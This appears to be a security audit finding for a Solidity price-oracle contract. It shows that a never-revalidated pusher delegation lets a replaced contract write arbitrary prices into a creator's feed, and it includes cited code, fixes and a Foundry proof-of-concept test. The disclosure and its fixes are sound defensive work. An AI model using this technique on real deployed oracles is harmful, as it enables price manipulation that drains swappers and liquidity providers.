### Title
Stale `namespaceRemapping` entry persists after contract-pusher replacement, enabling unauthorized writes into a creator's feed namespace — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowContractPushers` validates a contract pusher's consent via a one-time live `isPusher(creator)` staticcall and then permanently stores `namespaceRemapping[pusher] = creator`. The `fallback` push path never re-validates this mapping. If the contract at the pusher address is later replaced — via a proxy implementation upgrade or, on chains without EIP-6780, via `selfdestruct` + CREATE2 redeploy — the new contract inherits the delegation unconditionally and can write arbitrary prices into the creator's feed namespace.

---

### Finding Description

`allowContractPushers` checks consent at delegation time only:

```solidity
(bool ok, bytes memory res) = pusher.staticcall(
    abi.encodeWithSignature("isPusher(address)", msg.sender)
);
require(ok);
bool allowed = abi.decode(res, (bool));
require(allowed);

namespaceRemapping[pusher] = msg.sender;   // persists forever
``` [1](#0-0) 

The `fallback` push path resolves the namespace from the stored mapping with no re-validation:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
// ... writes into creator's namespace
``` [2](#0-1) 

The only push-time guards are a future-timestamp check and a monotonicity check — neither re-validates the pusher's authorization: [3](#0-2) 

The `namespaceRemapping` is keyed by address, not by code hash. Any code subsequently deployed at the same address inherits the delegation silently.

The design comment acknowledges the EOA variant (`allowPushers`) needs a deadline because "an undated signature could re-establish a delegation AFTER the pusher revoked it." The contract variant claims no deadline is needed because "there is nothing to replay." This reasoning is correct for replay, but it ignores the case where the contract at the pusher address is replaced — a structural change that is not a replay but produces the same unauthorized write authority. [4](#0-3) 

---

### Impact Explanation

A contract pusher that has been delegated into a creator's namespace and is subsequently replaced (proxy upgrade or, on pre-EIP-6780 chains, selfdestruct + CREATE2 redeploy) can push any price, spread, and timestamp into any slot of the creator's namespace. The only constraints are:

- Timestamp must not be in the future (`MAX_TIME_DRIFT` gate).
- Timestamp must be strictly newer than the stored slot timestamp (monotonicity gate).

Both constraints are trivially satisfied by a fresh, valid timestamp. The attacker can therefore write an arbitrary `U64x32`-encoded price and arbitrary `Codebook256` spread indices into the creator's feed slots.

Any pool whose `AnchoredPriceProvider` reads from a `CompressedOracleV1` feed in the compromised namespace will receive the attacker-controlled price. The `_readLeg` staleness check (`_isStale`) passes because the pushed timestamp is fresh. The `mid == 0` and `spreadBps >= ORACLE_BPS` guards pass because the attacker controls both fields. The `priceGuard` check passes if no guard is set (default `guardMin = 0`, `guardMax = type(uint128).max`). [5](#0-4) 

The result is bad-price execution: the pool's `getBidAndAsk` returns an attacker-controlled bid/ask, enabling the attacker to extract value from swappers or drain LP principal.

---

### Likelihood Explanation

**Trigger conditions:**

1. A creator must have called `allowContractPushers` with a contract the attacker controls or can influence.
2. The contract must be upgradeable (proxy) or destructible (pre-EIP-6780 chains).

**Proxy upgrade path (all chains):** An attacker deploys a proxy that initially returns `isPusher(creator) → true`. The creator delegates. The attacker upgrades the proxy implementation to one that pushes arbitrary prices. No selfdestruct is required; this works on Ethereum, Base, and HyperEVM.

**Selfdestruct + CREATE2 path (pre-EIP-6780 chains):** On HyperEVM (which may not implement EIP-6780), the attacker deploys a contract via CREATE2 that returns `isPusher → true`, gets delegated, self-destructs, and redeploys a malicious contract at the same address.

The creator has no on-chain mechanism to detect that the contract at the pusher address has changed after delegation. The `PusherAuthorized` event is emitted only at delegation time, not at push time.

---

### Recommendation

1. **Re-validate at push time (strongest fix):** In the `fallback`, when `namespaceRemapping[msg.sender]` is non-zero, perform a `staticcall` to `isPusher(creator)` on `msg.sender` before accepting the push. If the call fails or returns `false`, fall back to the pusher's own namespace (or revert). This is a gas cost trade-off but closes the window completely.

2. **Store a code hash at delegation time:** In `allowContractPushers`, record `keccak256(pusher.code)` alongside the mapping. In the `fallback`, verify that `keccak256(msg.sender.code)` still matches. This detects selfdestruct+redeploy but not proxy upgrades (since the proxy's own code hash is stable).

3. **Documentation (minimum):** Clearly document that `allowContractPushers` must only be used with non-upgradeable, non-destructible contracts, and that the creator bears full responsibility for the contract's future behavior.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "smart-contracts-poc/contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "smart-contracts-poc/contracts/oracles/utils/U64x32.sol";

/// Phase 1: legitimate contract — passes isPusher check
contract LegitPusher {
    address public immutable creator;
    constructor(address _creator) { creator = _creator; }
    function isPusher(address caller) external view returns (bool) {
        return caller == creator;
    }
}

/// Phase 2: malicious replacement deployed at the same CREATE2 address
///           (simulated here by vm.etch for brevity)
contract MaliciousPusher {
    // No isPusher — but namespaceRemapping already maps this address to creator
    function pushBadPrice(address oracle, uint8 slotId, uint32 badPrice, uint56 tsMs)
        external
    {
        uint256 word = (uint256(tsMs) << 8) | uint256(slotId);
        word |= uint256(badPrice) << (208 + 16); // position 0, price field
        (bool ok,) = oracle.call(abi.encodePacked(word));
        require(ok);
    }
}

contract StaleNamespaceRemappingPoC is Test {
    CompressedOracleV1 oracle;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        vm.warp(1_700_000_000);
    }

    function testStaleRemappingAllowsBadPricePush() public {
        // 1. Deploy legitimate contract pusher
        LegitPusher legit = new LegitPusher(creator);

        // 2. Creator delegates to it — isPusher check passes
        address[] memory pushers = new address[](1);
        pushers[0] = address(legit);
        vm.prank(creator);
        oracle.allowContractPushers(pushers);
        assertEq(oracle.namespaceRemapping(address(legit)), creator);

        // 3. Attacker replaces the contract at the same address with malicious code
        //    (In production: proxy upgrade. Here simulated with vm.etch.)
        MaliciousPusher malicious = new MaliciousPusher();
        vm.etch(address(legit), address(malicious).code);

        // 4. Malicious contract pushes an arbitrary price into creator's namespace
        uint32 badPriceEncoded = 0x00F00000; // arbitrary U64x32 value
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId = 0
        word |= uint256(badPriceEncoded) << 208;           // position 0

        vm.prank(address(legit)); // same address, now malicious code
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok, "malicious push must succeed");

        // 5. Creator's feed now contains the attacker-controlled price
        bytes32 feedId = oracle.feedIdOf(creator, 0, 0);
        IOffchainOracle.OracleData memory data = oracle.getOracleData(feedId);
        assertEq(data.price, U64x32.decode(badPriceEncoded),
            "attacker-controlled price landed in creator namespace");
        assertGt(data.price, 0, "non-zero bad price accepted");
    }
}
```

The test demonstrates that after `vm.etch` replaces the contract code at the pusher address (simulating a proxy upgrade), the `fallback` still routes the push into the creator's namespace because `namespaceRemapping[address(legit)]` was never cleared. [6](#0-5) [2](#0-1) [7](#0-6)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L214-234)
```text
    /// @notice Contract-pusher variant: consent is proven by a LIVE `isPusher(creator)`
    ///         staticcall instead of a signature, so there is nothing to replay and no
    ///         deadline is needed.
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L277-294)
```text
    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
```

**File:** smart-contracts-poc/contracts/interfaces/ICompressedOracleV1.sol (L36-37)
```text
    /// bits [255:96] creator, [95:16] chainid, [15:8] slotIndex, [7:0] positionIndex.
    function feedIdOf(address creator, uint8 slotIndex, uint8 positionIndex) external view returns (bytes32);
```
